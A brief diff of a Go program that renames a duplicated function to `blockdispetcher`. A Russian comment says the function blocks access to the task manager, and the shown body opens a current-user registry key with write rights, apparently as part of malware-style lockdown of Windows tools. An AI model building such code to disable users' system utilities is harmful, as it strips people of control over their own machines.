@@ -54,7 +54,7 @@ func blockreestr() {
 	}
 }
 // Блокировка доступа к диспетчеру задач
-func blockreestr() {
+func blockdispetcher() {
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\ZZZ`, registry.QUERY_VALUE|registry.SET_VALUE)
 	if err != nil {
 		log.Fatal(err)
